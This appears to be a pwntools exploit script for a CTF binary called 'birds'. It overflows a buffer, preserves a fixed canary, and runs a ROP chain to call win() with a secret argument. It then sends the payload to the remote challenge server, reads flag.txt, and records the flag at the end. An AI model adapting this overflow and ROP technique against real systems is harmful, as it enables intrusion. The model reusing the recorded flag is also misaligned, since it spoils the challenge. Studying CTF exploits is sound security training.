#!/usr/bin/env python3
from pwn import *

# Binary information
binary = './birds'
# remote_host = 'tjc.tf'
# remote_port = 31625

# Addresses from objdump
win_addr = 0x4011c4
gadget_addr = 0x4011b6
pop_rdi_ret = 0x4011c0  # pop rdi; ret gadget

# Constants
canary = 0xDEADBEEF
secret = 0xA1B2C3D4

def create_payload():
    """
    Create the buffer overflow payload.
    
    Stack layout from disassembly:
    - Buffer: 76 bytes (from rbp-0x50 to rbp-0x4)  
    - Canary: 4 bytes (at rbp-0x4)
    - Saved RBP: 8 bytes
    - Return address: 8 bytes
    
    ROP chain:
    The gadget at 0x4011c0 is: pop %rdi; nop; pop %rbp; ret
    So we need to provide two values on the stack:
    1. secret value for rdi
    2. dummy value for rbp
    3. then win function address
    """
    
    # ROP gadget: pop rdi; nop; pop rbp; ret
    pop_rdi_pop_rbp_ret = 0x4011c0
    
    payload = b'A' * 76                    # Fill buffer (76 bytes to reach canary)
    payload += p32(canary)                 # Preserve canary (4 bytes)
    payload += b'B' * 8                    # Saved RBP (8 bytes)
    
    # ROP chain to call win(0xA1B2C3D4)
    payload += p64(pop_rdi_pop_rbp_ret)    # pop rdi; nop; pop rbp; ret
    payload += p64(secret)                 # argument goes into rdi (first pop)
    payload += p64(0x4141414141414141)     # dummy value for rbp (second pop)
    payload += p64(win_addr)               # call win()
    
    return payload

def create_rop_payload():
    """
    Alternative payload using ROP chain approach.
    We need to find a way to set rdi = 0xA1B2C3D4 before calling win().
    """
    
    # Search for useful gadgets
    context.log_level = 'info'
    context.arch = 'amd64'
    
    payload = b'A' * 64                    # Fill buffer
    payload += p32(canary)                 # Preserve canary
    payload += b'B' * 4                    # Padding
    payload += b'C' * 8                    # Saved RBP
    
    # Since we need rdi = 0xA1B2C3D4, let's try to use the gadget creatively
    # The gadget sets rdi = 0x69, but we need a different value
    
    # Alternative: try to call win and manipulate the stack so that
    # the secret value ends up in the right place
    payload += p64(win_addr)
    
    return payload

def exploit_local():
    """Test the exploit locally"""
    log.info("Testing exploit locally...")
    
    # Try first payload
    p = process(binary)
    payload = create_payload()
    
    log.info(f"Sending payload of length: {len(payload)}")
    log.info(f"Payload: {payload}")
    
    p.sendline(payload)
    
    try:
        response = p.recv(timeout=2)
        log.info(f"Response: {response}")
        
        # Check if we got a shell
        p.sendline(b'echo "PWNED"')
        response2 = p.recv(timeout=2)
        log.info(f"Shell test response: {response2}")
        
        if b"PWNED" in response2:
            log.success("Got shell locally!")
            return True
            
    except Exception as e:
        log.error(f"Local exploit failed: {e}")
    
    p.close()
    return False

def exploit_remote():
    """Run the exploit against the remote server"""
    log.info("Connecting to remote server...")
    
    p = remote('tjc.tf', 31625)
    payload = create_payload()
    
    log.info(f"Sending payload to remote server...")
    p.sendline(payload)
    
    try:
        # Try to interact with the shell
        p.sendline(b'ls')
        response = p.recv(timeout=3)
        log.info(f"Remote response: {response}")
        
        if b"flag" in response.lower():
            log.success("Found flag file!")
            p.sendline(b'cat flag.txt')
            flag = p.recv(timeout=3)
            log.success(f"Flag: {flag}")
            
            # Also try to get more info
            p.sendline(b'pwd')
            pwd_response = p.recv(timeout=2)
            log.info(f"Current directory: {pwd_response}")
            
        log.info("Starting interactive session...")
        p.interactive()
            
    except Exception as e:
        log.error(f"Remote exploit error: {e}")
    
    p.close()

if __name__ == "__main__":
    # Set up pwntools context
    context.binary = binary
    context.log_level = 'debug'
    
    print("=" * 50)
    print("Birds CTF Challenge Exploit")
    print("=" * 50)
    
    # Test locally first
    # if exploit_local():
    #     print("\nLocal exploit successful! Now trying remote...")
    #     exploit_remote()
    # else:
    #     print("\nLocal exploit failed. Trying remote anyway...")
    #     exploit_remote()
    
    # Go straight to remote
    exploit_remote()

# tjctf{1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP}